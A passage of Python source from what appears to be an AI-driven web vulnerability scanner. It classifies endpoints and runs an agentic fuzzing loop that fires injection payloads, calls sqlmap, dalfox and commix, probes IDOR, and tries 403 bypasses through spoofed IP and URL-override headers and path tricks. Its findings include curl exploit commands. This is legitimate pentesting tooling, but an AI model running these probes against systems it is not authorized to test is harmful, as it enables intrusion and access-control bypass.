            "context_hint":  "Payment endpoint — business logic flaws are critical.",
        },
        "GRAPHQL": {
            "url_signals":   ["graphql", "gql", "graphiql", "__graphql", "graph"],
            "param_signals": ["query", "mutation", "subscription", "variables", "operationName"],
            "priority_tests": ["graphql_introspect", "sqli", "xss", "idor"],
            "context_hint":  "GraphQL endpoint — introspection, batching, and injection are high priority.",
        },
        "API_GENERAL": {
            "url_signals":   ["/api/", "/v1/", "/v2/", "/v3/", "/rest/", "/service/"],
            "param_signals": ["data", "body", "payload", "json", "xml", "input",
                               "value", "content", "message", "text"],
            "priority_tests": ["sqli", "xss", "ssti", "xxe", "idor"],
            "context_hint":  "API endpoint — common injection families are applicable.",
        },
    }
    PARAM_SEMANTICS = {
        "q":        ("search_query", "sqli,xss,ssti"),
        "query":    ("search_query", "sqli,xss,ssti"),
        "search":   ("search_query", "sqli,xss"),
        "keyword":  ("search_query", "sqli,xss"),
        "filter":   ("filter_query", "sqli,nosqli"),
        "id":       ("object_id", "idor,sqli"),
        "user_id":  ("object_id", "idor"),
        "name":     ("text_input", "sqli,xss,ssti"),
        "username": ("auth_input", "sqli,auth"),
        "password": ("auth_input", "sqli"),
        "email":    ("auth_input", "sqli,xss"),
        "file":     ("file_path", "lfi,path_traversal"),
        "path":     ("file_path", "lfi,path_traversal"),
        "page":     ("file_path", "lfi"),
        "include":  ("file_path", "lfi"),
        "template": ("file_path", "lfi,ssti"),
        "url":      ("url_param", "ssrf,open_redirect"),
        "redirect": ("url_param", "ssrf,open_redirect"),
        "next":     ("url_param", "open_redirect"),
        "callback": ("url_param", "ssrf,open_redirect"),
        "cmd":      ("cmd_param", "cmdi"),
        "host":     ("cmd_param", "ssrf,cmdi"),
        "ping":     ("cmd_param", "cmdi"),
        "ip":       ("cmd_param", "ssrf,cmdi"),
        "message":  ("text_input", "xss,ssti"),
        "content":  ("text_input", "xss,ssti"),
        "text":     ("text_input", "xss,ssti"),
        "comment":  ("text_input", "xss,ssti,stored_xss"),
        "title":    ("text_input", "xss,ssti"),
        "role":     ("priv_field", "mass_assign,param_tamper"),
        "admin":    ("priv_field", "mass_assign"),
        "status":   ("status_field", "param_tamper"),
        "amount":   ("numeric", "business_logic"),
        "price":    ("numeric", "business_logic"),
        "qty":      ("numeric", "business_logic"),
        "quantity": ("numeric", "business_logic"),
    }
    _ID_PATH_PATTERNS = [
        re.compile(r'/\d{1,15}(?:/|$)'),
        re.compile(r'/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I),
        re.compile(r'/[0-9a-f]{24,}(?:/|$)', re.I),
    ]

    @classmethod
    def analyze(cls, url: str, params: dict, method: str,
                response_sample: str = "") -> dict:
        url_lower = url.lower()
        parsed = urllib.parse.urlparse(url)
        path_lower = parsed.path.lower()
        path_orig = parsed.path
        clean_params = {}
        for k, v in params.items():
            clean_name = k.split(":")[-1].lower()
            if not k.startswith("header:") and not k.startswith("cookie:"):
                clean_params[clean_name] = str(v)[:50]

        risk_params = {}
        param_hints = []
        for pname, pval in clean_params.items():
            if pname in cls.PARAM_SEMANTICS:
                semantic, tests = cls.PARAM_SEMANTICS[pname]
                risk_params[pname] = {"semantic": semantic, "tests": tests, "value": pval[:20]}
                param_hints.append(f"'{pname}'={pval[:15]!r} -> {semantic} ({tests})")
            else:
                try:
                    int(pval)
                    risk_params[pname] = {"semantic": "numeric_id", "tests": "idor,sqli", "value": pval[:20]}
                    param_hints.append(f"'{pname}'={pval[:10]!r} -> numeric -> idor,sqli")
                except ValueError:
                    if len(pval) > 3:
                        risk_params[pname] = {"semantic": "text_input", "tests": "sqli,xss,ssti", "value": pval[:20]}
                        param_hints.append(f"'{pname}'={pval[:10]!r} -> text -> sqli,xss")

        file_surface = any(pn in clean_params for pn in cls.ENDPOINT_RULES["FILE_PATH"]["param_signals"])
        sensitive_file_target = ResponseClassifier.is_sensitive_file_target(url)
        if ResponseClassifier.is_static_asset_url(url) and not file_surface and not sensitive_file_target:
            return {
                "endpoint_type": "STATIC_ASSET",
                "all_types": ["STATIC_ASSET"],
                "priority_tests": [],
                "risk_params": risk_params,
                "context_hint": "Public/static browser asset — do not promote to FILE_PATH or auth-sensitive surface.",
                "param_analysis": "\n".join(param_hints) if param_hints else "No recognized params",
                "risk_level": "INFO",
                "response_hints": ["Static/public asset hard-negative rule applied"],
                "clean_params": clean_params,
            }

        detected_types = []
        for ep_type, config in cls.ENDPOINT_RULES.items():
            if ep_type == "FILE_PATH" and ResponseClassifier.is_static_asset_url(url) and not file_surface and not sensitive_file_target:
                continue
            url_match = any(sig in url_lower or sig in path_lower for sig in config["url_signals"])
            param_match = any(pn in clean_params for pn in config["param_signals"])
            if ep_type == "ID_BASED" and not url_match:
                for pat in cls._ID_PATH_PATTERNS:
                    if pat.search(path_orig):
                        url_match = True
                        break
            if url_match or param_match:
                score = (2 if url_match else 0) + (1 if param_match else 0)
                detected_types.append((score, ep_type, config))

        detected_types.sort(key=lambda x: -x[0])
        primary_type = detected_types[0][2] if detected_types else cls.ENDPOINT_RULES["API_GENERAL"]
        primary_name = detected_types[0][1] if detected_types else "API_GENERAL"
        priority_tests = list(primary_type["priority_tests"])
        for _, _, extra_config in detected_types[1:3]:
            for t in extra_config["priority_tests"]:
                if t not in priority_tests:
                    priority_tests.append(t)

        risk_level = "HIGH"
        if primary_name in ("COMMAND", "FILE_PATH", "AUTH", "ADMIN", "PAYMENT"):
            risk_level = "CRITICAL"

        response_hints = []
        if response_sample:
            rl = response_sample.lower()
            if "sql" in rl or "mysql" in rl or "syntax" in rl:
                response_hints.append("SQL-related content in response")
                if "sqli" not in priority_tests:
                    priority_tests.insert(0, "sqli")
            if "template" in rl or "jinja" in rl or "twig" in rl:
                response_hints.append("Template engine detected in response")
                if "ssti" not in priority_tests:
                    priority_tests.insert(0, "ssti")
            if "error" in rl or "exception" in rl or "traceback" in rl:
                response_hints.append("Error messages in response")

        return {
            "endpoint_type": primary_name,
            "all_types": [t for _, t, _ in detected_types],
            "priority_tests": priority_tests[:8],
            "risk_params": risk_params,
            "context_hint": primary_type["context_hint"],
            "param_analysis": "\n".join(param_hints) if param_hints else "No recognized params",
            "risk_level": risk_level,
            "response_hints": response_hints,
            "clean_params": clean_params,
        }


# ─────────────────────────────────────────────────────────────────────────────
# TRUE AGENTIC FUZZ ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class AgenticFuzzEngine:
    """
    NEW IN v8.0: True agentic loop.
    Instead of running fixed tests in order, AI decides what to test next
    based on accumulated state. Stops when AI says there's nothing valuable left.
    """

    # Params NOT to test with SSRF/LFI/CMDi (but fine for SQLi/XSS)
    _AUTH_PARAMS = {"csrf","csrf_token","_token","token","remember","captcha","otp","code"}
    _SSRF_NAMES  = {"url","redirect","next","return","callback","dest","target","src",
                    "load","fetch","uri","link","href","proxy","endpoint","site","feed","host"}
    _LFI_NAMES   = {"file","path","dir","include","load","read","open","page","template",
                    "tpl","view","layout","doc","document","folder","filename","filepath",
                    "content","conf","config","log"}
    _CMDI_NAMES  = {"cmd","exec","command","run","shell","system","ping","ip","hostname","query"}
    _MANDATORY_INJECTION_PARAMS = {
        "q", "query", "search", "keyword", "keywords", "term", "terms",
        "filter", "find", "lookup", "s", "k", "w", "text",
        "id", "user_id", "uid", "account_id", "product_id", "item_id",
        "post_id", "comment_id", "order_id",
        "name", "username", "email", "input", "data", "value",
        "content", "message", "comment", "title", "slug", "body",
        "file", "path", "page", "include", "load", "template", "doc",
        "url", "redirect", "next", "src", "href", "dest", "target",
        "cmd", "exec", "command", "ping", "host", "ip",
    }

    def __init__(self, client: HTTPClient, baseline: BaselineEngine,
                 kali: KaliToolRunner, ai: AIEngine,
                 ctx: ScanContext, oob: Optional[OOBClient] = None):
        self.client   = client
        self.baseline = baseline
        self.kali     = kali
        self.ai       = ai
        self.ctx      = ctx
        self.oob      = oob
        self.memory   = ctx.memory  # FailureMemory reference

    def _seed_scan_state_with_response(self, ep: Endpoint, scan_state: dict) -> None:
        if ep.method != "GET":
            return
        resp = self.client.get(ep.url)
        self._last_resp = resp
        body = str(resp.get("body", ""))
        headers = resp.get("headers", {}) or {}
        profile = ResponseClassifier.classify(ep.url, headers, body, resp.get("status", 0))
        sensitive_candidates = RiskScorer.score_body(body, url=ep.url, headers=headers)
        scan_state["last_status"] = resp.get("status", scan_state.get("last_status", 0))
        scan_state["last_size"] = len(body)
        scan_state["last_response_snippet"] = body[:400]
        scan_state["response_body_sample"] = body[:1200]
        scan_state["response_class"] = profile.get("verdict", "unknown")
        scan_state["response_class_reason"] = profile.get("reason", "")
        scan_state["response_title"] = profile.get("title", "")
        scan_state["response_error"] = resp.get("error", "")
        scan_state["has_strong_sensitive_candidate"] = RiskScorer.has_strong_sensitive_candidate(
            sensitive_candidates
        )

    def test_endpoint(self, ep: Endpoint) -> List[Finding]:
        """
        True agentic loop: AI decides what to test next.
        ALWAYS runs auth bypass first if endpoint is 403/401.
        """
        findings   : List[Finding] = []
        base_fp    = self.baseline.get(ep)
        tests_done : List[str]     = []
        signals    : List[str]     = []

        # ALWAYS run auth bypass immediately if endpoint returns 403/401
        # Don't wait for AI to decide — every 403 endpoint must be bypassed
        if base_fp.status in (401, 403):
            console.print(f"  [dim yellow]  403/401 detected — running immediate bypass: {ep.url}[/dim yellow]")
            auth_results = self._test_auth_bypass(ep, base_fp)
            findings.extend(auth_results)
            if auth_results:
                tests_done.append("test_auth:immediate")
                signals.extend(f"{f.owasp_id}:{f.title[:40]}" for f in auth_results)

        self._mandatory_injections(ep, base_fp, tests_done, findings, signals)

        clean_params_display = {
            k.split(":")[-1]: v
            for k, v in ep.params.items()
            if not k.startswith("header:") and not k.startswith("cookie:")
        }
        scan_state = {
            "url": ep.url,
            "method": ep.method,
            "tech": self.ctx.site_tech,
            "params_raw": dict(ep.params),
            "params": list(ep.params.keys())[:20],
            "clean_params": clean_params_display,
            "tests_done": tests_done,
            "last_status": base_fp.status,
            "last_size": base_fp.body_len,
            "signals": signals,
            "findings": [f.title for f in findings[:5]],
            "last_response_snippet": "",
            "response_body_sample": "",
            "response_class": "unknown",
            "response_class_reason": "",
            "response_title": "",
            "response_error": "",
            "has_strong_sensitive_candidate": False,
        }
        self._seed_scan_state_with_response(ep, scan_state)

        # Agentic loop: AI available bo'lsa, aks holda priority-based fallback
        ai_available = HAS_OLLAMA
        # Fallback action-lar — AI yo'q bo'lganda statik tartibda bajariladi
        _FALLBACK_ACTIONS = [
            ("test_sqli",  next((k for k in ep.params if "id" not in k.lower()
                                 and not k.startswith("header:")), "")),
            ("test_xss",   next((k for k in ep.params if not k.startswith("header:")), "")),
            ("test_lfi",   next((k for k in ep.params
                                 if any(x in k.lower() for x in ["file","path","page","doc"])
                                 ), "")),
            ("test_ssrf",  next((k for k in ep.params
                                 if any(x in k.lower() for x in ["url","redirect","src","href"])
                                 ), "")),
            ("test_idor",  next((k for k in ep.params if "id" in k.lower()), "")),
            ("test_auth",  ""),
        ]
        _fallback_idx = 0

        for iteration in range(AGENTIC_MAX_ITER):
            if ai_available:
                decision = self.ai.decide_next_action(scan_state, memory=self.memory)
                if decision is None:
                    ai_available = False
                    decision = {"action":"stop","reason":"AI unavailable","priority":0}
            else:
                # Statik fallback — AI-siz ham ishlaydi
                if _fallback_idx >= len(_FALLBACK_ACTIONS):
                    break
                fb_action, fb_param = _FALLBACK_ACTIONS[_fallback_idx]
                _fallback_idx += 1
                if not fb_param and fb_action not in ("test_auth","test_header"):
                    continue
                decision = {
                    "action":   fb_action,
                    "param":    fb_param,
                    "reason":   f"Fallback (no AI): running {fb_action}",
                    "priority": 8 - _fallback_idx,
                }

            action   = decision.get("action","stop")
            param    = decision.get("param","")
            reason   = decision.get("reason","")
            priority = decision.get("priority",0)

            # ── AI REASONING LOG ─────────────────────────────────────────────
            # Topshiriq 2: AI har qarorini tushuntirsin
            if action == "stop":
                stop_reason = decision.get("stop_reason", reason or "AI decided no more tests needed")
                console.print(
                    f"  [dim cyan]  🤖 AI decision [{iteration+1}]: STOP[/dim cyan]\n"
                    f"  [dim]     Reason: {stop_reason}[/dim]"
                )
            else:
                param_info = (" → param=" + param) if param else ""
                console.print(
                    f"  [dim cyan]  🤖 AI decision [{iteration+1}]: {action}"
                    f"{param_info} (priority:{priority}/10)[/dim cyan]\n"
                    f"  [dim]     Why: {reason}[/dim]"
                )

            if action == "stop" or priority < 2:
                break

            # FailureMemory: bu action bu tech+endpoint da avval befoyda bo'lganmi?
            if self.memory:
                endpoint_type = self.memory._url_pattern(ep.url)
                if self.memory.is_action_useless(action, endpoint_type, self.ctx.site_tech):
                    console.print(
                        f"  [dim]  🧠 Memory skip: '{action}' on {endpoint_type} "
                        f"({self.ctx.site_tech.get('lang','?')}) — tried 3+ times, no result[/dim]"
                    )
                    tests_done.append(f"memory_skip:{action}")
                    scan_state["tests_done"] = tests_done
                    continue

            tests_done.append(f"{action}:{param}")
            scan_state["tests_done"] = tests_done

            result = self._execute_action(action, param, ep, base_fp)
            if result:
                findings.extend(result)
                scan_state["findings"] = [f.title for f in findings[:5]]
                for f in result:
                    signals.append(f"{f.owasp_id}:{f.title[:40]}")
            scan_state["signals"] = signals

            if hasattr(self, "_last_resp") and self._last_resp:
                last_body = str(self._last_resp.get("body", ""))
                last_headers = self._last_resp.get("headers", {}) or {}
                last_profile = ResponseClassifier.classify(
                    ep.url, last_headers, last_body, self._last_resp.get("status", base_fp.status)
                )
                last_sensitive = RiskScorer.score_body(last_body, url=ep.url, headers=last_headers)
                scan_state["last_response_snippet"] = last_body[:400]
                scan_state["response_body_sample"] = last_body[:1200]
                scan_state["last_status"] = self._last_resp.get("status", base_fp.status)
                scan_state["last_size"]   = len(last_body)
                scan_state["response_class"] = last_profile.get("verdict", "unknown")
                scan_state["response_class_reason"] = last_profile.get("reason", "")
                scan_state["response_title"] = last_profile.get("title", "")
                scan_state["response_error"] = self._last_resp.get("error", "")
                scan_state["has_strong_sensitive_candidate"] = RiskScorer.has_strong_sensitive_candidate(
                    last_sensitive
                )

        return findings

    def _mandatory_injections(self, ep: Endpoint, base_fp: BaselineFingerprint,
                              tests_done: List[str], findings: List[Finding],
                              signals: List[str]) -> None:
        for param_key, param_val in list(ep.params.items()):
            pname = param_key.split(":")[-1].lower()
            if param_key.startswith("header:") or param_key.startswith("cookie:"):
                continue
            if pname not in self._MANDATORY_INJECTION_PARAMS:
                continue
            action_key = f"mandatory:{param_key}"
            if action_key in tests_done:
                continue
            tests_done.append(action_key)
            console.print(
                f"  [dim cyan]  Mandatory injection: "
                f"param={pname} value={str(param_val)[:15]} url={ep.url[:50]}[/dim cyan]"
            )

            for vuln_type in ("sqli", "xss", "ssti"):
                result = self._test_injection(vuln_type, param_key, ep, base_fp)
                findings.extend(result)
                signals.extend(f"A03:{vuln_type}:{f.confidence}" for f in result)

            if pname in {"file", "path", "page", "include", "load", "template", "doc"}:
                result = self._test_injection("lfi", param_key, ep, base_fp)
                findings.extend(result)
                signals.extend(f"A03:lfi:{f.confidence}" for f in result)

            if pname in {"url", "redirect", "next", "src", "href", "dest", "target"}:
                result = self._test_ssrf(param_key, ep, base_fp)
                findings.extend(result)
                signals.extend(f"A10:ssrf:{f.confidence}" for f in result)

            if pname in {"cmd", "exec", "command", "ping", "host", "ip"}:
                result = self._test_injection("cmdi", param_key, ep, base_fp)
                findings.extend(result)
                signals.extend(f"A03:cmdi:{f.confidence}" for f in result)

    def _execute_action(self, action: str, param: str,
                        ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
        """Execute a specific test action."""
        if action == "test_sqli":
            return self._test_injection("sqli", param, ep, base_fp)
        elif action == "test_xss":
            return self._test_injection("xss", param, ep, base_fp)
        elif action == "test_lfi":
            return self._test_injection("lfi", param, ep, base_fp)
        elif action == "test_ssti":
            return self._test_injection("ssti", param, ep, base_fp)
        elif action == "test_ssrf":
            return self._test_ssrf(param, ep, base_fp)
        elif action == "test_cmdi":
            return self._test_injection("cmdi", param, ep, base_fp)
        elif action == "test_idor":
            return self._test_idor(param, ep, base_fp)
        elif action == "test_auth":
            return self._test_auth_bypass(ep, base_fp)
        elif action == "test_header":
            return self._test_security_headers(ep, base_fp)
        elif action == "fuzz_params":
            return self._fuzz_params(ep, base_fp)
        elif action == "test_nosqli":
            return self._test_nosqli_full(param, ep, base_fp)
        elif action == "test_stored_xss":
            return self._test_stored_xss(param, ep, base_fp)
        elif action == "test_second_order_sqli":
            return self._test_second_order_sqli(param, ep, base_fp)
        elif action == "test_mass_assign":
            return self._test_mass_assignment(ep, base_fp)
        elif action == "test_open_redirect":
            return self._test_open_redirect(param, ep, base_fp)
        elif action == "test_crlf":
            return self._test_crlf(param, ep, base_fp)
        elif action == "test_prototype":
            return self._test_injection("prototype", param, ep, base_fp)
        elif action == "test_graphql":
            return self._test_graphql(ep)
        return []

    def _test_injection(self, vuln_type: str, param: str,
                        ep: Endpoint, base_fp: BaselineFingerprint) -> List[Finding]:
        """
        Generic injection test with AI-generated payloads.
        Tries AI-generated payloads first, then falls back to static.
        """
        # Get AI-generated payloads for this tech stack
        context = {
            "tech":            self.ctx.site_tech,
            "url":             ep.url,
            "param":           param,
            "response_sample": "",
        }
        payloads = self.ai.generate_payloads(vuln_type, context)

        # Also get system wordlist if available
        wl_path = WordlistScanner.best(vuln_type)

        tool_out  = {"output": ""}
        tool_name = vuln_type

        # Use specialized Kali tools for better detection
        if vuln_type == "sqli" and shutil.which("sqlmap"):
            pname      = param.split(":")[-1]
            clean      = {k.split(":")[-1]:v for k,v in ep.params.items()
                          if not k.startswith("header:") and not k.startswith("path:")}
            data_str   = urllib.parse.urlencode(clean) if ep.method=="POST" else ""
            tool_out   = self.kali.sqlmap(ep.url, param, ep.method, data_str)
            tool_name  = "sqlmap"
        elif vuln_type == "xss" and shutil.which("dalfox"):
            clean     = {k.split(":")[-1]:v for k,v in ep.params.items()
                         if not k.startswith("header:") and not k.startswith("path:")}
            data_str  = urllib.parse.urlencode(clean) if ep.method=="POST" else ""
            tool_out  = self.kali.dalfox(ep.url, param, data_str, ep.method)
            tool_name = "dalfox"
        elif vuln_type == "cmdi" and shutil.which("commix"):
            clean    = {k.split(":")[-1]:v for k,v in ep.params.items()
                        if not k.startswith("header:") and not k.startswith("path:")}
            data_str = urllib.parse.urlencode(clean) if ep.method=="POST" else ""
            tool_out = self.kali.commix(ep.url, param, data_str, ep.method)
            tool_name = "commix"

        # FailureMemory: bu texnologiyada avval ishlamagan payloadlarni filter
        if self.memory:
            payloads = self.memory.filter_known_bad_payloads(
                vuln_type, payloads, self.ctx.site_tech
            )

        # Try payloads
        best_resp, best_diff, best_payload = None, {}, ""
        for payload in payloads[:8]:
            if self.ctx.already_tested(ep.url, ep.method, param, payload):
                continue
            fuzz_resp = self._fuzz_request(ep, param, payload)
            self._last_resp = fuzz_resp
            diff = self.baseline.diff(base_fp, fuzz_resp, fuzz_resp.get("timing",0))
            if self.baseline.diff_is_interesting(diff):
                best_resp    = fuzz_resp
                best_diff    = diff
                best_payload = payload
                break

        if best_resp is None and not tool_out.get("output"):
            return []

        resp_for_ai = best_resp or {}
        context_ai  = {
            "url":              ep.url,
            "method":           ep.method,
            "param":            param,
            "payload":          best_payload,
            "tool":             tool_name,
            "baseline_status":  base_fp.status,
            "baseline_size":    base_fp.body_len,
            "baseline_timing":  base_fp.timing_avg,
            "baseline_title":   base_fp.title,
            "fuzz_status":      resp_for_ai.get("status",0),
            "fuzz_size":        len(resp_for_ai.get("body","")),
            "fuzz_timing":      resp_for_ai.get("timing",0),
            "timing_diff":      best_diff.get("timing_diff",0),
            "size_diff":        best_diff.get("size_diff",0),
            "size_pct":         best_diff.get("size_pct",0),
            "time_anomaly":     best_diff.get("time_anomaly",False),
            "new_errors":       best_diff.get("new_errors",[]),
            "status_changed":   best_diff.get("status_changed",False),
            "body_snippet":     resp_for_ai.get("body","")[:600],
            "tool_output":      tool_out.get("output","")[:800],
        }
        ai_r = self.ai.classify_finding(context_ai, memory=self.memory)
        if not ai_r or not ai_r.get("found"):
            if ai_r and ai_r.get("confidence",0) > 20:
                self.ctx.add_signal({**context_ai,"ai":ai_r})
            # FailureMemory: payload ishlamadi — yodlab qo'y
            if self.memory and best_payload:
                self.memory.record_failed_payload(
                    vuln_type=tool_name,
                    payload=best_payload,
                    tech=self.ctx.site_tech,
                    reason=ai_r.get("false_positive_reason","no signal") if ai_r else "no diff",
                )
            return []

        conf = ai_r.get("confidence",50)
        if conf < MIN_CONFIDENCE: return []

        diff_str = json.dumps(best_diff, default=str)[:300] if best_diff else ""
        f = Finding(
            owasp_id  = ai_r.get("owasp_id","A03"),
            owasp_name= ai_r.get("owasp_name","Injection"),
            title     = ai_r.get("title",""),
            risk      = ai_r.get("risk","Medium"),
            confidence= conf,
            url=ep.url, method=ep.method, param=param, payload=best_payload,
            evidence  = ai_r.get("evidence","") or tool_out.get("output","")[:220],
            baseline_diff=diff_str,
            tool_output=tool_out.get("output","")[:500],
            request_raw=self._build_req(ep, param, best_payload),
            response_raw=(resp_for_ai.get("body","")[:600] if resp_for_ai else ""),
            exploit_cmd=ai_r.get("exploit_cmd",""),
            remediation=ai_r.get("remediation",""),
            tool=tool_name,
        )
        self._print_finding(f)
        return [f]

    def _test_ssrf(self, param: str, ep: Endpoint,
                   base_fp: BaselineFingerprint) -> List[Finding]:
        """SSRF test with OOB callback if available."""
        payloads = self.ai.generate_payloads("ssrf", {"tech": self.ctx.site_tech,"url": ep.url,"param": param})

        if self.oob and self.oob.domain:
            oob_payload = self.oob.payloads("ssrf").get("ssrf","")
            if oob_payload: payloads.insert(0, oob_payload)

        for payload in payloads[:6]:
            if self.ctx.already_tested(ep.url, ep.method, param, payload): continue
            resp = self._fuzz_request(ep, param, payload)
            body = resp.get("body","").lower()
            self._last_resp = resp

            # OOB callback check
            if self.oob and self.oob.domain and payload == payloads[0]:
                time.sleep(1.5)
                if self.oob.check(token="ssrf", wait=4.0):
                    f = self._make_finding(
                        "A10","SSRF",f"Blind SSRF via OOB: {ep.url} [{param}]",
                        "High",95,ep.url,ep.method,param,payload,
                        "OOB DNS/HTTP callback received",
                        "",f"curl '{ep.url}?{param}={payload}'",
                        "Whitelist allowed URLs. Block internal IPs.",
                        confirmed=True, oob=True
                    )
                    self._print_finding(f)
                    return [f]

            # Direct SSRF indicators
            ssrf_confirmed = (
                ("root:" in body and "/bin/" in body) or
                ("ami-id" in body or "instance-id" in body) or
                ("[extensions]" in body) or
                ("localhost" in body and resp.get("status")==200 and
                 len(body)>len(str(base_fp.body_len or 0))+100)
            )
            if ssrf_confirmed:
                f = self._make_finding(
                    "A10","SSRF",f"SSRF via {param}: {ep.url}",
                    "Critical" if "169.254" in payload else "High",
                    88,ep.url,ep.method,param,payload,
                    f"SSRF response contains internal data: {body[:200]}",
                    "",f"curl '{ep.url}?{param}={payload}'",
                    "Validate and whitelist allowed URLs.",
                    confirmed=True
                )
                self._print_finding(f)
                return [f]
        return []

    def _test_idor(self, param: str, ep: Endpoint,
                   base_fp: BaselineFingerprint) -> List[Finding]:
        """IDOR test — numeric ID, UUID, hash, slug all tested."""
        pname = param.split(":")[-1]
        orig  = str(ep.params.get(param,"1"))

        # Determine type and generate test values
        test_values = []

        if re.fullmatch(r"\d+", orig):
            # Numeric ID — adjacent values
            n = int(orig)
            test_values = [str(n+1), str(n-1), str(n+2), "0",
                           "999999", str(n+100)]

        elif re.fullmatch(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", orig, re.I):
            # UUID — try all-zeros and all-ones
            test_values = [
                "00000000-0000-0000-0000-000000000001",
                "00000000-0000-0000-0000-000000000002",
                "ffffffff-ffff-ffff-ffff-ffffffffffff",
                orig[:-4] + "0001",  # increment last segment
            ]

        elif re.fullmatch(r"[0-9a-f]{32,}", orig, re.I):
            # Hash-like ID
            test_values = [
                "0" * len(orig),
                "a" * len(orig),
                "1" * len(orig),
            ]

        elif re.fullmatch(r"[a-z0-9][a-z0-9\-]{3,78}[a-z0-9]", orig) and "-" in orig:
            # Slug — try predictable variations
            parts = orig.split("-")
            test_values = [
                orig,  # same — sanity check
                parts[0] + "-1",
                parts[0] + "-2",
                "admin",
                "test",
            ]

        else:
            # Generic — try common values
            test_values = ["1", "2", "0", "admin", "null", "-1"]

        if not test_values:
            return []

        for test_val in test_values:
            if test_val == orig: continue
            if self.ctx.already_tested(ep.url,"GET",param,test_val): continue
            resp  = self.client.get(self._rebuild_url(ep.url, pname, test_val))
            diff  = self.baseline.diff(base_fp, resp, resp.get("timing",0))
            self._last_resp = resp

            if diff.get("status_changed") or diff.get("size_pct",0) > 15:
                ctx_ai = {
                    "url": ep.url, "method":"GET", "param": param,
                    "payload": f"{pname}={test_val}",
                    "tool": "idor_probe",
                    "baseline_status": base_fp.status, "baseline_size": base_fp.body_len,
                    "baseline_timing": base_fp.timing_avg, "baseline_title": base_fp.title,
                    "fuzz_status": resp.get("status"), "fuzz_size": len(resp.get("body","")),
                    "fuzz_timing": resp.get("timing",0),
                    "timing_diff": diff.get("timing_diff",0),
                    "size_diff": diff["size_diff"], "size_pct": diff["size_pct"],
                    "time_anomaly": False, "new_errors": diff.get("new_errors",[]),
                    "status_changed": diff["status_changed"],
                    "body_snippet": resp.get("body","")[:500],
                    "tool_output": f"ID {orig}→{test_val}: size diff {diff['size_diff']}",
                }
                ai_r = self.ai.classify_finding(ctx_ai)
                if ai_r and ai_r.get("found") and ai_r.get("confidence",0) >= MIN_CONFIDENCE:
                    f = Finding(
                        owasp_id="A01", owasp_name="Broken Access Control",
                        title=ai_r.get("title","Possible IDOR"),
                        risk=ai_r.get("risk","Medium"), confidence=ai_r.get("confidence",50),
                        url=ep.url, method="GET", param=param,
                        payload=test_val, evidence=ai_r.get("evidence",""),
                        baseline_diff=json.dumps(diff)[:200], tool_output="",
                        request_raw=f"GET {ep.url}?{pname}={test_val}",
                        response_raw=resp.get("body","")[:400],
                        exploit_cmd=ai_r.get("exploit_cmd",""),
                        remediation=ai_r.get("remediation",""),
                    )
                    self._print_finding(f)
                    return [f]
        return []

    def _test_auth_bypass(self, ep: Endpoint,
                          base_fp: BaselineFingerprint) -> List[Finding]:
        """
        Comprehensive 403/401 bypass testing.
        Tests: IP spoofing headers, URL override headers, path variants, method override.
        Returns ALL successful bypasses (not just first one).
        """
        if base_fp.status not in (401, 403):
            return []

        findings: List[Finding] = []
        path     = urllib.parse.urlparse(ep.url).path

        # Get clean baseline to compare against (the actual 403 response body)
        clean_resp = self.client.get(ep.url)
        clean_hash = hashlib.md5(clean_resp.get("body","").encode()).hexdigest()
        clean_size = len(clean_resp.get("body",""))

        def is_real_bypass(r: dict) -> tuple:
            """Returns (is_bypass, confidence, evidence)"""
            if r.get("status") not in (200, 201, 202, 206):
                return False, 0, ""
            body = r.get("body","")
            if len(body) < 50:
                return False, 0, ""
            body_hash = hashlib.md5(body.encode()).hexdigest()
            # Same response as 403 page → not a bypass
            if body_hash == clean_hash:
                return False, 0, ""
            body_l = body.lower()
            # Login page with no sensitive data → not a real bypass
            login_sigs = sum(1 for s in ["password","login","sign in","username","please log"]
                             if s in body_l)
            sens = RiskScorer.score_body(body)
            if login_sigs >= 2 and not sens:
                return False, 0, ""
            # Real bypass: different content + no login page
            conf = 85 if sens else (70 if abs(len(body)-clean_size) > 100 else 55)
            ev   = f"Status {base_fp.status}→{r['status']}, body size: {clean_size}→{len(body)}"
            if sens:
                ev += f", sensitive data: {[s['key'] for s in sens[:3]]}"
            return True, conf, ev

        # ── 1. IP Spoofing headers ────────────────────────────────────────────
        ip_headers = {
            "X-Forwarded-For":           "127.0.0.1",
            "X-Real-IP":                 "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Originating-IP":          "127.0.0.1",
            "X-Forwarded-Host":          "localhost",
            "X-Host":                    "127.0.0.1",
            "Client-IP":                 "127.0.0.1",
            "True-Client-IP":            "127.0.0.1",
        }
        for h, v in ip_headers.items():
            r = self.client.get(ep.url, extra_headers={h: v})
            self._last_resp = r
            ok, conf, ev = is_real_bypass(r)
            if ok:
                f = self._make_finding(
                    "A01","Broken Access Control",
                    f"IP Bypass via {h}: {path}",
                    "High", conf, ep.url, "GET", f"header:{h}", v,
                    ev, f"{base_fp.status}→{r['status']}",
                    f"curl -H '{h}: {v}' '{ep.url}'",
                    f"Never trust {h} for IP-based access control.",
                    confirmed=(conf >= 80),
                    response_raw=r.get("body","")[:2000],
                )
                self._print_finding(f)
                findings.append(f)

        # ── 2. URL Override headers ───────────────────────────────────────────
        url_headers = {
            "X-Original-URL":   path,
            "X-Rewrite-URL":    path,
            "X-Override-URL":   path,
            "X-HTTP-DestinationURL": ep.url,
            "Referer":          ep.url,
        }
        for h, v in url_headers.items():
            r = self.client.get(ep.url, extra_headers={h: v})
            self._last_resp = r
            ok, conf, ev = is_real_bypass(r)
            if ok:
                f = self._make_finding(
                    "A01","Broken Access Control",
                    f"URL Override Bypass via {h}: {path}",
                    "High", conf, ep.url, "GET", f"header:{h}", v,
                    ev, f"{base_fp.status}→{r['status']}",
                    f"curl -H '{h}: {v}' '{ep.url}'",
                    "Do not use client-provided URL override headers for routing decisions.",
                    confirmed=(conf >= 80),
                    response_raw=r.get("body","")[:2000],
                )
                self._print_finding(f)
                findings.append(f)

        # ── 3. Path variant bypass ────────────────────────────────────────────
        # These trick the WAF/router but reach the same backend handler
        path_variants = [
            ep.url + "/",
            ep.url + "%20",
            ep.url + "%09",
            ep.url + "/..",
            ep.url + "/.",
            ep.url + "..;/",
            ep.url + "?",
            ep.url + "#",
            ep.url + "/*",
